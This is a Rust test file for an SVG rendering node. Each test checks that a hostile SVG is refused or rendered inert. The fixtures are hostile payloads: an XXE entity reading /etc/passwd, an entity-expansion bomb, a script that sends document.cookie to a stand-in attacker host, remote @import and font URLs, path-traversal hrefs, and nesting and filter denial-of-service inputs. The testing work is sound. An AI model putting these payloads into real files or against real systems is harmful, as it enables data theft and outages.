//! What an SVG from a stranger may not do.
//!
//! The node converts SVG nobody on this platform wrote: a model's answer, a
//! member's upload, a template carried in a project bundle. Each test here
//! is one thing such a file must not achieve, and the mechanism that stops
//! it. A test that starts failing is a hole, not a style change.
//!
//! The four layers, outermost first:
//!
//! 1. **No XML entity is ever declared.** A `<!DOCTYPE>` carrying an
//!    internal subset — the only place an entity can be declared — is
//!    refused by name; the plain SVG 1.1 doctype a drawing program writes
//!    is cut out, never fetched. So there is no `file:///etc/passwd`
//!    through an external entity and no expansion bomb.
//! 2. **Only the project's own bytes are fetched.** One resolver answers
//!    every `href`, from a cache filled before the render; a URL or a
//!    `data:` URI is refused by name, and `resolve_data` answers `None` so
//!    usvg cannot inline one behind our back.
//! 3. **usvg draws, it does not execute.** `<script>` is not JavaScript to a
//!    static renderer, `@import` fetches nothing, `<use>` and `feImage`
//!    reach no host. Each is proven by rendering the file and finding the
//!    rest of the picture intact.
//! 4. **Bounded work.** The source is capped at 512 KB, canvas pixels are
//!    capped before allocation, and nesting is capped at
//!    [`MAX_DEPTH`](super::MAX_DEPTH) because every walker over the tree —
//!    usvg's, resvg's, the layout report's and the tree's own destructor —
//!    recurses. One input is **not** bounded: an SVG filter can cost
//!    unbounded CPU, and the node renders inline, so it holds an async
//!    worker. See the last test.
//!
//! What these tests do **not** cover, deliberately: the SVG *text* is still
//! dangerous to serve to a browser. Nothing here makes a stored `.svg` safe
//! under `public/`; only the picture this node answers is safe.
//!
//! Colours are written `rgb(r,g,b)` rather than `#rrggbb` so no fixture
//! needs a `"#` inside a raw string.

use std::collections::HashMap;
use std::sync::Arc;

use super::*;

fn fonts() -> FontSet {
    FontSet::bundled()
}

fn empty_resolver() -> Resolver {
    Resolver::new(Arc::new(MemoryStore(HashMap::new())))
}

fn png(svg: &str) -> Result<Rendered, ConvertError> {
    convert(svg, &fonts(), &empty_resolver(), &Target::default(), OutputFormat::Png, 82)
}

/// The centre pixel, to prove the harmless part of a hostile file still drew.
fn centre(r: &Rendered) -> [u8; 4] {
    let img = image::load_from_memory(&r.bytes).unwrap().to_rgba8();
    img.get_pixel(img.width() / 2, img.height() / 2).0
}

#[test]
fn an_external_entity_cannot_read_a_file_and_an_entity_bomb_cannot_expand() {
    // XXE: the classic. If this ever renders, /etc/passwd is in the picture.
    let xxe = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="0" y="50" font-family="Inter">&xxe;</text></svg>"#;
    let err = png(xxe).unwrap_err();
    assert_eq!(err.kind, ConvertErrorKind::Source);
    assert!(err.message.contains("DTD"), "{}", err.message);

    // Billion laughs, small enough to be harmless if it ever did expand.
    let bomb = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&c;</text></svg>"#;
    assert!(png(bomb).unwrap_err().message.contains("DTD"));

    // The rule is precise: a DTD with an *internal subset* is refused,
    // because that is the only place an entity can be declared. The plain
    // SVG 1.1 doctype every drawing program writes declares nothing, so it
    // is cut out and the file converts — otherwise most real templates
    // would be rejected.
    let illustrator = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="rgb(255,0,0)"/></svg>"#;
    assert_eq!(centre(&png(illustrator).expect("a plain doctype is harmless")), [255, 0, 0, 255]);

    // And the refusal names what to remove, rather than saying "DTD".
    let subset = r#"<!DOCTYPE svg [<!ENTITY a "x">]><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>"#;
    assert!(png(subset).unwrap_err().message.contains("internal DTD subset"));
}

#[test]
fn a_script_a_stylesheet_import_and_a_webfont_are_inert_and_the_picture_still_draws() {
    // usvg renders, it does not execute. The rect is the witness: if the
    // file had been refused there would be no picture at all, and if the
    // script had run it would have reached for a host.
    let hostile = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <script>fetch("http://attacker.test/" + document.cookie)</script>
        <style>@import url("http://attacker.test/x.css"); @font-face { font-family: E; src: url("http://attacker.test/f.ttf"); }</style>
        <a href="javascript:alert(1)"><rect width="100" height="100" fill="rgb(255,0,0)"/></a>
    </svg>"#;
    let out = png(hostile).expect("renders");
    assert_eq!(centre(&out), [255, 0, 0, 255], "the rect drew; the script and the import did not");
}

#[test]
fn every_road_to_a_remote_or_local_file_is_refused_or_answers_nothing() {
    // `<image>`: refused by name at parse time, so the author sees why.
    for href in [
        "http://attacker.test/a.png",
        "https://attacker.test/a.png",
        "//attacker.test/a.png",
        "file:///etc/passwd",
        "data:image/png;base64,iVBORw0KGgo=",
        "../../../etc/passwd",
        "/etc/passwd",
        "zebfs://../../secret.png",
        "repo://pages/home.tsx",
    ] {
        let svg = format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><image href="{href}" width="10" height="10"/></svg>"#
        );
        let err = png(&svg).unwrap_err();
        assert_eq!(err.kind, ConvertErrorKind::Source, "{href}");
        assert!(err.message.contains("picture"), "{href}: {}", err.message);
    }

    // `<use>` and `feImage` are not fetched by this node, so they reach the
    // renderer — where the resolver answers nothing for a foreign scheme and
    // `resolve_data` answers None. The picture draws without them.
    let sneaky = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <use href="http://attacker.test/a.svg#x"/>
        <filter id="f"><feImage href="http://attacker.test/a.png"/></filter>
        <rect width="100" height="100" fill="rgb(0,255,0)"/>
    </svg>"#;
    let out = png(sneaky).expect("renders");
    assert_eq!(centre(&out), [0, 255, 0, 255], "the rect drew; nothing was fetched");
}

#[test]
fn a_picture_the_resolver_never_fetched_is_not_drawn_from_anywhere_else() {
    // The render-time resolver answers only from the cache the parse pass
    // filled, so nothing can be smuggled in by a reference the check missed.
    let mut map = HashMap::new();
    map.insert(Source::Store("real.png".into()), test_support::solid_png(4, 4, [0, 0, 255]));
    let resolver = Resolver::new(Arc::new(MemoryStore(map)));
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><image href="real.png" width="20" height="20"/></svg>"#;
    assert!(convert(svg, &fonts(), &resolver, &Target::default(), OutputFormat::Png, 82).is_ok());
    let opt = fonts().options();
    assert!(resolver.image_kind("never-asked-for.png", &opt).is_none());
    assert!(resolver.image_kind("http://attacker.test/a.png", &opt).is_none());
    assert!(resolver.image_kind("file:///etc/passwd", &opt).is_none());
}

#[test]
fn the_work_is_bounded_in_source_size_canvas_and_nesting() {
    let fonts = fonts();
    let resolver = empty_resolver();

    // Source: over the cap, refused before it is parsed.
    let big = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><!--{}--><rect width="10" height="10"/></svg>"#,
        "x".repeat(MAX_SVG_BYTES)
    );
    assert!(png(&big).unwrap_err().message.contains("limit"));

    // Canvas: a request for 64 megapixels is refused before allocation.
    let small = r#"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>"#;
    let err = convert(small, &fonts, &resolver, &Target { width: Some(8000), height: Some(8000), fit: Fit::Fill }, OutputFormat::Png, 82).unwrap_err();
    assert!(err.message.contains("cap"), "{}", err.message);

    // Nesting: 4000 groups deep overflowed the stack and aborted the whole
    // process before MAX_DEPTH existed — the server, not the node. It must
    // now be refused, by name, and cheaply.
    let deep = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">{}<rect width="20" height="20" fill="rgb(255,0,0)"/>{}</svg>"#,
        "<g>".repeat(4000),
        "</g>".repeat(4000)
    );
    let started = std::time::Instant::now();
    let err = png(&deep).unwrap_err();
    assert_eq!(err.kind, ConvertErrorKind::Source);
    assert!(err.message.contains("deep"), "{}", err.message);
    assert!(started.elapsed().as_secs() < 5, "refusing deep nesting took {:?}", started.elapsed());

    // An ordinary drawing's nesting is untouched.
    let ordinary = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">{}<rect width="20" height="20" fill="rgb(255,0,0)"/>{}</svg>"#,
        "<g>".repeat(30),
        "</g>".repeat(30)
    );
    assert_eq!(centre(&png(&ordinary).expect("30 deep is ordinary")), [255, 0, 0, 255]);
}

#[test]
fn a_filter_cannot_run_away_with_the_thread() {
    // A turbulence and a wide blur over a poster-sized canvas: the expensive
    // end of what a hostile file can ask for with no custom code. This
    // records what it costs, so a regression that makes it unbounded shows.
    let bomb = r#"<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1350">
        <filter id="f" x="-100%" y="-100%" width="300%" height="300%">
            <feTurbulence baseFrequency="0.002" numOctaves="8"/>
            <feGaussianBlur stdDeviation="500"/>
        </filter>
        <rect width="1080" height="1350" filter="url(#f)" fill="rgb(255,0,0)"/>
    </svg>"#;
    let started = std::time::Instant::now();
    let out = png(bomb).expect("renders");
    let took = started.elapsed();
    eprintln!("filter bomb 1080x1350: {took:?}, {} bytes", out.bytes.len());
    // MEASURED, NOT SOLVED. On this machine the render above takes about 45
    // seconds of one core, and the node does its work inline, so a hostile
    // file holds an async worker for that long and no engine timeout can
    // interrupt it. Filters are the one input whose cost is not bounded by
    // the caps in the test above. The fix is a wall-clock budget around the
    // render — a decision the owner has not made — so this asserts only
    // that the cost has not grown by an order of magnitude.
    assert!(took.as_secs() < 180, "a filter took {took:?}: the cost has run away");
}
